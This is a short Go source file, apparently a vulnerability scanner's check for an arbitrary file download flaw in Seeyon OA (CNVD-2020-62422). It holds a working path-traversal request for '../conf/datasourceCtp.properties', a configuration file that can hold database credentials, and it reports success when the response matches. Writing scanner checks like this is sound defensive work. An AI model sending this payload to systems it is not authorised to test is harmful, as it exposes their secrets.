package seeyon

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

// webmail.do任意文件下载

func CNVD_2020_62422(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties", "GET", "", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "workflow") {
			return true
		}
	}
	return false
}
